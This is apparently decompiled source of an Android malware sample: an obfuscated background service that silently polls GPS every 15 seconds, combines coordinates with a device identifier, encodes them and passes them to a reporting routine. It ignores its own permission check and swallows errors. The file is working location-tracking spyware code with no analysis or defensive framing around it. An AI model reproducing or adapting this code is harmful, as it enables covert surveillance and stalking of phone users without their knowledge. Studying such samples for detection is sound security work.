package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;

public class blkzyyyfc extends Service {

    /* renamed from: a */
    C0034b f355a = new C0034b();

    /* renamed from: b */
    public LocationManager f356b;

    /* renamed from: c */
    private LocationListener f357c = new LocationListener() {
        public void onLocationChanged(Location location) {
            blkzyyyfc.this.m280a(location);
        }

        public void onProviderDisabled(String str) {
        }

        public void onProviderEnabled(String str) {
        }

        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    };

    /* access modifiers changed from: private */
    /* renamed from: a */
    public void m280a(Location location) {
        if (location != null && location.getProvider().equals("gps")) {
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            C0034b bVar = this.f355a;
            StringBuilder sb2 = new StringBuilder();
            sb2.append(this.f355a.mo247q(this));
            sb2.append(":");
            sb2.append(m282b(location));
            sb2.append(":GPS:");
            sb.append(bVar.mo225c(sb2.toString()));
            this.f355a.mo218b(this, "5", sb.toString());
        }
    }

    /* renamed from: b */
    private String m282b(Location location) {
        if (location == null) {
            return "";
        }
        return String.format("%1$.4f:%2$.4f", new Object[]{Double.valueOf(location.getLatitude()), Double.valueOf(location.getLongitude())}).replace(",", ".");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        this.f356b = (LocationManager) getSystemService("location");
        try {
            checkCallingOrSelfPermission("android.permission.ACCESS_FINE_LOCATION");
            this.f356b.requestLocationUpdates("gps", 15000, 10.0f, this.f357c);
        } catch (Exception unused) {
        }
        return i;
    }
}
